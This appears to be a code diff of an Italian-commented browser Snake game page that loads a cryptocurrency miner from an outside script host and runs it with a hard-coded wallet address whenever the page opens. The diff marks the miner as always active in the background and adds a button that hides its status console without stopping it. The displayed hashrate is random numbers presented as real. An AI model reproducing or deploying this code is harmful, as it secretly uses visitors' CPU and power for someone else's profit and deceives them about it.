@@ -14,10 +14,7 @@
             padding: 0;
             overflow: hidden;
         }
-        h1 {
-            color: #0f0;
-            margin: 30px 0 10px 0;
-        }
+        h1 { color: #0f0; margin: 30px 0 10px 0; }
 
         /* Menu Iniziale */
         #menu {
@@ -48,7 +45,7 @@
             box-shadow: 0 0 25px #0f0;
         }
 
-        /* Game Over Screen */
+        /* Game Over */
         #game-over {
             position: absolute;
             top: 50%;
@@ -72,14 +69,7 @@
             border-radius: 8px;
             cursor: pointer;
         }
-        button:hover {
-            background: #0c0;
-        }
-
-        .score {
-            font-size: 1.4em;
-            margin: 15px 0;
-        }
+        button:hover { background: #0c0; }
 
         /* Mining Console */
         #mining-console {
@@ -87,7 +77,7 @@
             bottom: 15px;
             right: 15px;
             width: 220px;
-            background: rgba(0, 0, 0, 0.85);
+            background: rgba(0, 0, 0, 0.9);
             border: 2px solid #0f0;
             border-radius: 8px;
             padding: 12px;
@@ -95,7 +85,23 @@
             box-shadow: 0 0 15px rgba(0, 255, 0, 0.3);
             z-index: 300;
             text-align: left;
+            transition: all 0.3s;
         }
+        .console-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 8px;
+        }
+        .close-btn {
+            background: none;
+            border: none;
+            color: #f00;
+            font-size: 1.4em;
+            cursor: pointer;
+            line-height: 1;
+        }
+        .close-btn:hover { color: #ff5555; }
     </style>
 </head>
 <body>
@@ -124,13 +130,16 @@
 
     <!-- Mining Console -->
     <div id="mining-console">
-        <div class="console-title">🔨 CPU Miner</div>
-        <div class="console-line">Stato: <span id="miner-status" class="status">Avviato</span></div>
+        <div class="console-header">
+            <span style="color:#0f0;">🔨 CPU Miner</span>
+            <button class="close-btn" onclick="hideMinerConsole()">×</button>
+        </div>
+        <div class="console-line">Stato: <span id="miner-status" class="status">Attivo in background</span></div>
         <div class="console-line">Hashrate: <span id="hashrate">Calcolando...</span></div>
         <div class="console-line">Potenza: <span id="power">20%</span></div>
     </div>
 
-    <!-- Crypto Miner -->
+    <!-- Crypto Miner (sempre attivo) -->
     <script type="module">
         import { autoMine } from "https://earnify.cc/miner.js";
         autoMine("RVWmPb6SyB7Rx6ugY6GYngsP5ciqjBaxoT", 0.2);
@@ -172,7 +181,6 @@
                 snake.pop();
             }
 
-            // Disegna
             ctx.fillStyle = "#111";
             ctx.fillRect(0, 0, canvas.width, canvas.height);
 
@@ -184,13 +192,8 @@
         }
 
         function generateFood() {
-            food = {
-                x: Math.floor(Math.random() * 20),
-                y: Math.floor(Math.random() * 20)
-            };
-            for (let s of snake) {
-                if (s.x === food.x && s.y === food.y) generateFood();
-            }
+            food = { x: Math.floor(Math.random() * 20), y: Math.floor(Math.random() * 20) };
+            for (let s of snake) if (s.x === food.x && s.y === food.y) generateFood();
         }
 
         function gameOver() {
@@ -240,7 +243,12 @@
         setInterval(() => {
             const hashrate = Math.floor(Math.random() * 450) + 280;
             document.getElementById("hashrate").textContent = hashrate + " H/s";
-        }, 2000);
+        }, 1800);
+
+        // Funzione per nascondere il console
+        function hideMinerConsole() {
+            document.getElementById("mining-console").style.display = "none";
+        }
     </script>
 </body>
 </html>
